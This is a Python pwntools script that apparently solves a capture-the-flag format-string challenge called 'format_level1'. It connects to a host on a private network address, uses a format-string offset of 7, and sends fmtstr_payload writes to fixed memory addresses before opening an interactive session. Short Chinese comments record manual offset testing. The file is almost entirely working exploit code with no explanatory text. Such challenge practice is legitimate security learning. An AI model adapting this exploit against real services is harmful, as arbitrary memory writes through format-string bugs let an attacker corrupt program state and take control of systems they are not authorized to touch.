from pwn import * 
from pwn import p64


context(arch='i386',os = 'linux')
debug = 0
gdb_is = 0
# context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./format_level1")
    
else:
    host = "192.168.0.111:2519"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./format_level0",'b get_name')
    gdb.attach(r,'b get_key')
    # gdb.attach(r)
    pause()
    pass

# def exec_fmt(pad):
#     r.sendlineafter(b'choice: \n',b'3')
#     r.send(pad)
#     r.recvuntil(b'said: \n')
#     return r.recvuntil(b'But')[:-3]
# fmt = FmtStr(exec_fmt)
# print("offset ===>",fmt.offset)
# payload = fmtstr_payload(fmt.offset,{0x804C014:9999999})
#不好用 pad太长不能自动测

# ----------------------手动测
# r.sendlineafter(b'choice: \n',b'3')
# r.send(b'flag%7$p')
# r.recvuntil(b'said: \n')
# info(r.recvuntil(b'But')[:-3])

offset = 7
print("offset ===>",offset)
payload = fmtstr_payload(offset,{0x804C014+4:99999},write_size='int')
r.sendlineafter(b'choice: \n',b'3')
r.send(payload)
payload = fmtstr_payload(offset,{0x804C00C:1},write_size='int')
r.sendlineafter(b'choice: \n',b'3')
r.send(payload)
r.interactive()
